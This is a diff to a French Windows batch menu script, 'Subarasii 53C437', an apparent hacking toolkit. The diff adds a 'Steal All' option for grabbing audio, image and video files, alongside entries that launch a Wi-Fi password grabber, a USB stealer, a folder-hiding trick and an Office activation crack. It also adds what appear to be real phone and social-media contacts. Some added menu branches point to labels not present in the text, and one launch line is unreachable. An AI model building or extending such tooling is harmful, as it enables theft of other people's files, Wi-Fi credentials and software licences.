@@ -2,7 +2,7 @@
 title Subarasii 53C437
 set matrix=0
 :debut
-if %matrix% == 20 goto INFO
+if %matrix% == 2 goto INFO
 color 08
 echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
 color 0A
@@ -45,11 +45,12 @@ cls
 echo.
 echo        ##########################################################
 echo        #                 Script  : Subarasii 53C437             #
-echo        #                 Version : 1.1 alpha                    #
+echo        #                 Version : 1 alpha                    #
 echo        #                 Auteur  : Random                       #
-echo        #                 Whatsapp: +*** *********               #
-echo        #                 Telegram: https://t.me/*****           #
-echo        #                 Facebook: m.me/*******.*****.*         #
+echo        #                 Whatsapp: wa.me/+2250758591558         #
+echo        #                 Telegram: t.me/+2250758591558          #
+echo        #                 Facebook: m.me/salomon.russo.3         #
+echo        #                 Github  : github.com/c2Vuc2Vp          #
 echo        ##########################################################
 echo.
 pause
@@ -175,22 +176,27 @@ echo.
 set/p "choix_host=>"
 if %choix_host%==1 goto WIFI
 if %choix_host%==99 goto RESEAU
-echo Choix invalide
+echo Choix invalide.
+pause
 goto waf
 echo.
 :CHOST
-start reseau/hostpost/creerHostpost.bat
+cd reseau/hostpost/
+start creerHostpost.bat
 goto hostpost
 echo.
 :DHOST
-start reseau/hostpost/demarrerHostpost.bat
+cd reseau/hostpost/
+start demarrerHostpost.bat
 goto hostpost
 :SHOST
-start reseau/hostpost/stopHostpost.bat
+cd reseau/hostpost/
+start stopHostpost.bat
 goto hostpost
 echo.
 :WIFI
-start reseau/wifi/mdp.bat
+cd reseau/wifi/
+start mdp.bat
 goto waf
 echo.
 
@@ -204,13 +210,16 @@ echo.
 color f9
 if EXIST fichiers/cacher/53C437 echo 1~     Cacher 53C437
 if EXIST fichiers/cacher/"Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" echo 2~     Decacher 53C437
+echo 3~     Steal All
 echo 99~    Retour
 echo.
 set/p "choix_fichier=>"
 if %choix_fichier%==1 goto CACHER
 if %choix_fichier%==2 goto DECACHER
+if %choix_fichier%==3 goto STEALALL
 if %choix_fichier%==99 goto banner
 echo Choix invalide.
+pause
 goto FICHIERS
 echo.
 :CACHER
@@ -221,13 +230,15 @@ goto FICHIER
 :DECACHER
 if EXIST fichiers/cacher/"Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" goto UNLOCK
 :LOCK
-start fichiers/cacher/cacher.bat
+cd fichiers/cacher/
+start cacher.bat
 goto banner
 :UNLOCK
 rem echo Entre le mot de passe pour deverouiller le dossier.
 rem set/p "pass=>"
 rem if NOT %pass%== 53C437 goto FAIL
-start fichiers/cacher/afficher.bat
+cd fichiers/cacher/
+start afficher.bat
 goto banner
 :FAIL
 echo Mot de passe invalide
@@ -237,6 +248,29 @@ md fichiers/cacher/53C437
 echo Dossier 53C437 cree avec succes.
 echo.
 goto CACHER
+:STEALALL
+@ECHO OFF
+cls
+echo.
+color 04
+echo 1~     All
+echo 2~     Audios
+echo 3~     Images
+echo 4~     Videos
+echo 99~    Retour
+echo.
+set/p "choix_steal=>"
+if %choix_steal%==1 goto All
+if %choix_steal%==2 goto Audios
+if %choix_steal%==3 goto Images
+if %choix_steal%==4 goto Videos
+if %choix_steal%==99 goto FICHIER
+echo Choix invalide.
+pause
+goto STEALALL
+cd fichiers
+start stealall.bat
+goto FICHIER
 
 
 
@@ -253,7 +287,8 @@ set/p "choix_other=>"
 if %choix_other%==1 goto USB
 if %choix_other%==2 goto AMO16
 if %choix_other%==99 goto banner
-echo Choix invalide
+echo Choix invalide.
+pause
 echo.
 goto OTHER
 :USB
@@ -266,18 +301,21 @@ echo.
 set/p "choix_other=>"
 if %choix_other%==1 goto USBSTEALER
 if %choix_other%==99 goto OTHER
-echo Choix invalide
+echo Choix invalide.
+pause
 echo.
 goto USB
 :USBSTEALER
 @ECHO OFF
 cls
-start autres/usb/usbstealer.bat
+cd autres/usb/
+start usbstealer.bat
 goto USB
 :AMO16
 @ECHO OFF
 cls
-start autres/activations_word_16.bat
+cd autres/
+start activations_word_16.bat
 goto OTHER
 
 :End
